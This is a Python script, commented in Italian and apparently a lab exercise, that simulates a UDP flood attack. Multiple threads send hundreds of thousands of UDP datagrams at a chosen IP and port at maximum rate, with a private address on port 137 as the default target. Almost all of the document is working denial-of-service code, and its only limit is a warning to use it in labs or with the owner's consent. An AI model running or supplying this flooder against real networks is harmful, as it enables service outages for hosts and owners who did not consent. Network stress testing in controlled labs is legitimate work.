#!/usr/bin/env python3
"""
Simulazione di un attacco UDP Flood (ESERCIZIO DI LABORATORIO)
================================================================
Invia un flusso massiccio di datagrammi UDP verso un target in ascolto.

USO:
    python udp_flood.py --target 192.168.50.105 --port 137 \
        --packets 500000 --size 512 --interval 0.0

SOLO in ambienti di laboratorio / con consenso esplicito del proprietario!
"""

import argparse
import socket
import sys
import threading
import time


def flood_worker(target: str, port: int, total: int, size: int,
                 interval: float, worker_id: int) -> None:
    """Thread che invia `total` datagrammi UDP verso target:port."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = bytes(size)  # payload fittizio (zero)
    sent = 0
    try:
        while sent < total:
            try:
                sock.sendto(payload, (target, port))
                sent += 1
            except (OSError, socket.error) as e:
                print(f"[worker-{worker_id}] errore invio: {e}",
                      file=sys.stderr)
                break
            if interval > 0:
                time.sleep(interval)
    finally:
        sock.close()
    print(f"[worker-{worker_id}] completati {sent} pacchetti")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Simulatore di UDP Flood (solo per laboratori)")
    parser.add_argument("--target", default="192.168.50.105",
                        help="Indirizzo IP del target (default: 192.168.50.105)")
    parser.add_argument("--port", type=int, default=137,
                        help="Porta UDP del target")
    parser.add_argument("--packets", type=int, default=500000,
                        help="Numero totale di pacchetti da inviare ")
    parser.add_argument("--size", type=int, default=1024,
                        help="Dimensione del payload in byte")
    parser.add_argument("--interval", type=float, default=0.0,
                        help="Pausa in secondi tra un pacchetto e l'altro "
                             "(default: 0, cioè velocità massima)")
    parser.add_argument("--threads", type=int, default=2,
                        help="Numero di thread per aumentare il "
                             "throughput")
    args = parser.parse_args()

    if args.threads <= 0:
        parser.error("--threads deve essere >= 1")
    if args.size < 0:
        parser.error("--size deve essere >= 0")

    per_thread = max(1, args.packets // args.threads)
    print(f"=== UDP Flood Simulator ===")
    print(f"Target     : {args.target}:{args.port}/udp")
    print(f"Pacchetti  : {args.packets} ({per_thread} per thread)")
    print(f"Payload    : {args.size} byte")
    print(f"Thread     : {args.threads}")
    print(f"Intervallo : {args.interval}s")
    print("Avvio dell'attacco... (Ctrl+C per fermarlo)\n")

    threads = []
    start = time.time()
    for i in range(args.threads):
        t = threading.Thread(target=flood_worker,
                             args=(args.target, args.port, per_thread,
                                   args.size, args.interval, i),
                             daemon=True)
        t.start()
        threads.append(t)

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("\nInterrotto dall'utente.")
        for t in threads:
            t.join(timeout=1)

    elapsed = time.time() - start
    if elapsed > 0:
        print(f"\nFatto in {elapsed:.2f}s -> "
              f"~{args.packets / elapsed:,.0f} pkt/s, "
              f"~{args.packets * (args.size + 8) / elapsed / 1024:,.0f} KiB/s")


if __name__ == "__main__":
    main()
